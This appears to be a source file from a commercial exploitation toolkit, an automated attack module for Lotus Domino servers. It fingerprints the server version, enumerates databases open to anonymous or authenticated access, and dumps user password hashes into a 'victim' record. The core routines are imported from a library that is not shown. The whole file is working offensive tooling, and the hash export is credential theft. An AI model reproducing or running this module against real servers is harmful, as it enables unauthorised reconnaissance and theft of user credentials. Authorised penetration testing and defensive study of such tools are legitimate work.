#! /usr/bin/env python

#
# Proprietary D2 Exploitation Pack source code - use only under the license 
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2010
#

import autopwn
import appli.lotus
import xmlrpclib

class run(autopwn.run):

  CANVAS_EXPLOITS = {
  }

  def lotus_fingerprint(self, target, port):
    result = ''
    self.log.info('Check HTTP server header')
    version = appli.lotus.check_header_server(target, port)
    if version:
      result += 'Version: %s\n' % version
      self.log.info('Version: %s' % version)
    else:
      self.log.info('No header')

    self.log.info('Lotus Server Fingerprint')
    versions = appli.lotus.fingerprint(target, port)
    if versions:
      for version in versions:
        result += 'Version found: %s\n' % version
        self.log.info('Version found: %s' % version)
    else:
      self.log.info('No server version')
    return result

  def check_acl(self, target, port):
    result = ''
    self.log.info('Check acl')
    (auth, anonymous) = appli.lotus.checkacl(target, port)
    if anonymous:
      result += 'Bases with anonymous access :\n'
      for anon in anonymous:
        result += '\t%s\n' % anon
    if auth:
      result += 'Bases with authentication access :\n'
      for b in auth:
        result += '\t%s\n' % b
    return result
  
  def lotus_hash(self, target, port):
    result = ''
    hashes = appli.lotus.export_hash(target, port, 1)
    if not hashes:
      return result
    result += '%-24s %-24s %-24s %-24s\n' % ("FirstName", "LastName", "ShortName", "HTTPPassword")
    result += '-'*120
    result += '\n'
    for firstname, other in hashes.items():
      result += '%-24s %-24s %-24s %-24s\n' % (firstname, other[0], other[1], other[2])
    return result

  def exploit(self, target, port):
    fct = {
      'Lotus fingerprint': self.lotus_fingerprint,
      'Lotus scan': self.check_acl,
      'Lotus hash': self.lotus_hash,
    }

    for ident, function in fct.items():
      result = function(target, port)
      self.db.db_unique_info(self.victim, self.service, ident, 'autopwn_lotus', result)
      self.log.debug(result)
